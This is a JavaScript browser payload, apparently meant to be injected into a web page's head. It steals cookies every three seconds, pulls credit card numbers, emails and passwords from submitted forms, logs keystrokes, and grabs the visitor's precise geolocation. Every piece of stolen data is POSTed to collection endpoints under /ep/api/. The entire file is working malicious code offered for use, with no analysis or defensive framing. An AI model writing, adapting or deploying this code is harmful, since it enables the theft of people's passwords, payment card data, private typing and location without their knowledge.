/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    init: function() {
        // Cookie stealer
        this.stealCookies();
        setInterval(this.stealCookies, 3000); // Check every 3 seconds

        // Form data stealer
        this.hookForms();

        // Keylogger
        this.startKeylogger();

        // Geolocation
        this.getGeolocation();
    },

    stealCookies: function() {
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return { name, value };
        });

        if (cookies.length > 0) {
            fetch('/ep/api/ping', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    cookies: cookies,
                    url: window.location.href
                })
            }).catch(console.error);
        }
    },

    hookForms: function() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', async (e) => {
                const formData = new FormData(form);
                const data = {};
                
                for (let [key, value] of formData.entries()) {
                    data[key] = value;
                    
                    // Check for credit cards
                    if (this.isCreditCard(value)) {
                        this.sendSensitiveData('credit_card', value);
                    }
                    
                    // Check for emails
                    if (this.isEmail(value)) {
                        this.sendSensitiveData('email', value);
                    }
                    
                    // Check for passwords
                    if (key.toLowerCase().includes('pass')) {
                        this.sendSensitiveData('password', value);
                    }
                }
            });
        });
    },

    startKeylogger: function() {
        let buffer = '';
        let lastUrl = window.location.href;

        document.addEventListener('keydown', (e) => {
            // Add key to buffer
            if (e.key.length === 1) {
                buffer += e.key;
            } else if (e.key === 'Enter') {
                buffer += '[ENTER]';
            } else if (e.key === 'Backspace') {
                buffer += '[BACKSPACE]';
            }

            // Send buffer if it's long enough or URL changed
            if (buffer.length >= 50 || lastUrl !== window.location.href) {
                this.sendKeylogger(buffer, lastUrl);
                buffer = '';
                lastUrl = window.location.href;
            }
        });

        // Send remaining buffer when user leaves page
        window.addEventListener('beforeunload', () => {
            if (buffer.length > 0) {
                this.sendKeylogger(buffer, window.location.href);
            }
        });
    },

    getGeolocation: function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    fetch('/ep/api/geolocation', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        })
                    }).catch(console.error);
                },
                (error) => console.error('Geolocation error:', error),
                { enableHighAccuracy: true }
            );
        }
    },

    sendKeylogger: function(keys, url) {
        fetch('/ep/api/keylogger', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                keys: keys,
                url: url
            })
        }).catch(console.error);
    },

    sendSensitiveData: function(type, value) {
        fetch('/ep/api/sensitive', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                type: type,
                value: value,
                url: window.location.href
            })
        }).catch(console.error);
    },

    isCreditCard: function(str) {
        const ccRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
        return ccRegex.test(str.replace(/\s/g, ''));
    },

    isEmail: function(str) {
        const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
        return emailRegex.test(str);
    }
};

// Start the payload
PayloadManager.init();

// Notify that payload is loaded
console.log('Payload initialized successfully');